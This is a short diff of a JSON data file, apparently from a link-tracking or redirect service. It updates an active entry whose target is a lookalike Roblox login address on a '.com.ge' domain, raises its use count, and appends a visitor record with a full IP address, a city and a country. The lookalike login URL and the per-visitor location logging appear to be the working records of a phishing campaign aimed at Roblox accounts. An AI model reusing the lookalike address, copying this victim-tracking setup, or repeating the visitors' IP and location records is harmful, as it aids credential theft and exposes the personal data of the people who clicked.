@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1281,
+    "useCount": 1282,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10392,6 +10392,14 @@
         "city": "Geislingen an der Steige",
         "flag": "🇩🇪",
         "countryCode": "DE"
+      },
+      {
+        "timestamp": 1777367557382,
+        "ip": "112.211.198.188",
+        "country": "Philippines",
+        "city": "Dasmariñas",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
